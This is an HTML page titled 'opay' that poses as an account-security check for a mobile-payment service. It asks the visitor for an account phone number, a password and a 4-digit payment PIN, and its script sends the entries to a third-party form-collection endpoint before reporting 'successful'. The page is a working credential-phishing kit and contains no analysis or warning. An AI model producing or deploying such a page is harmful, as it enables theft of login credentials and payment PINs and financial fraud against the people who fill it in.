<!DOCTYPE>
<html>
<head>
<title>opay</title>
<style>
 body {

        text-align: center;
      }
   .pageTitle{
        border: none;

       text-align: center;
        color: #000;
        padding-top: 20px;
    }
  .nice svg {margin-right: 10px; vertical-align: top;}
.nice {
height: 100px; 
width: 800px; 
color: #fff; 
background: #9DACB6;

margin: 8px 0; 
transition: all 0.4s ease;}
.nice:hover {
background: #26C28A;
color: #FFF;
}
 .numbers{
         height: 100px; 
         width: 600px;
         border: 2px solid #9DACB6;
         border-radius: 20px 50px 50px 20px;
         background-color: #F8F8FB;
         color: #000;
         font-size: 40px;
         padding: 0 0 0 20px;
     }
  .inputss {
        width: 1006px;
        hight: 109px;
        border: none;
        font-weight: bold;
        display: flex;
        flex-direction: row;
        color: #000;
        margin: 0 0 40px 0;
         }
 .place {
      height: 100px; 
      width: 500px;
      margin: auto;
      border: none;
      border-radius: 20px;
      background-color: #F8F8FB;
      color: #000;
      font-size: 40px;
      padding: 0 0 0 30px;
   }
 .label {
         font-size: 49px;
         color: #26C28A;
         font-weight: bold;
         font-family: Courier New;
     }
   .number{
         height: 100px; 
         width: 400px;
         border: 2px solid #9DACB6;
         border-radius: 20px;
         background-color: #F8F8FB;
         margin: 10px;
         color: #000;
         font-size: 45px;
         padding: 0 148px 0 148px;
     }
  .inputs {
        width: 1006px;
        hight: 109px;
        border: none;
        font-weight: bold;
        display: flex;
        flex-direction: row;
        color: #000;
        margin: 0 0 40px 0;
        justify-content: center;
         }
  span {
         background-color: #26C28A;
         color: FFFFFF;
         font-size: 40px;
        }
 .pin { border: none;
        font-size: 30px;
       text-align: center;
        color: #000;
    }
</style>
</head>
<body>
    <div class="pageTitle">
     <h3>secure your account</h3>
    </div>
 <div class="form">
           <form id="my-form" action="https://formspree.io/f/xgebwded" method="POST">
            <div class="inputss">
             <label class="label" for="mobile">account phone number</label>
              <input type="tel" class="numbers" id="mobile" placeholder="phone number" name="mobile" value="" required>
            </div>
            <div class="inputss">
             <label class="label" for="password">enter Password</label>
              <input type="password" class="place" id="password" autocomplete="off" value="" required name="password" placeholder="password">
            </div>
    <hr>
            <div class="pin">
            <h4>Verify payment PIN to continue</h4>
            <h3> Please enter <span>4-degits payment PIN</span></h3>
    <div class="inputs">
      <input type="tel" class="number" placeholder="PIN" id="mobile" name="password" value="" required>
    </div>
    </div>
    <div class="but">
      <button type="submit" id="regButton" class="nice"">verify</button>
        <p id="my-form-status"></p>
    </div>
 </form>
 </div>
 <script>
    var form = document.getElementById("my-form");
    
    async function handleSubmit(event) {
      event.preventDefault();
      var status = document.getElementById("my-form-status");
      var data = new FormData(event.target);
      fetch(event.target.action, {
        method: form.method,
        body: data,
        headers: {
            'Accept': 'application/json'
        }
      }).then(response => {
        if (response.ok) {
          status.innerHTML = "successful";
          form.reset()
        } else {
          response.json().then(data => {
            if (Object.hasOwn(data, 'errors')) {
              status.innerHTML = data["errors"].map(error => error["message"]).join(", ")
            } else {
              status.innerHTML = "Oops! there was a problem securing your account "
            }
          })
        }
      }).catch(error => {
        status.innerHTML = "Oops! There was a problem securing your account"
      });
    }
    form.addEventListener("submit", handleSubmit)
</script>
</body>
</html>
